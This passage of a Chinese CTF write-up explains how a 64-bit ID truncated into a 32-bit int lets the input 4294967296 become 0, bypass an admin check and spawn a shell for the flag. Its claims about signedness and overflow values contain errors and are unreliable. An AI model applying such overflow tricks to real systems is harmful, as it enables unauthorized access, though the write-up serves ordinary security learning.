<p>这时细心观察可以发现，原本的id是输入到int_64的v7，经过函数返回值是v7，然后返回到int类型的v5里，这时想到整数溢出。两个都是无符号型，int可以表示的范围：-2147483648<sub>2147483647，如果int大于上界，2147483648相当于-2147483648，2147483649相当于-2147483648，依次递推。int_64可以表示的范围：-9223372036854775808</sub>9223372036854775807。</p>
<p>思路是：直接让v7不通过else语句，就不会因为密码错误改变v7的值，从而返回的是输入的v7，然后继续通过判断语句，到达输入成功的函数，打开shell获取flag。</p>
<p>要想满足以上条件，需要v7(int_64)为真且!v5(int)为真，这里可以输入4294967296，先进入if语句，输出非管理员语句，然后直接返回自身到v5，这时因为整数溢出相当为0，v5为真成立，得到shell。</p>
<figure data-type="image" tabindex="18"><img src="https://zyyiszyy.github.io/post-images/1615187097213.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
</feed>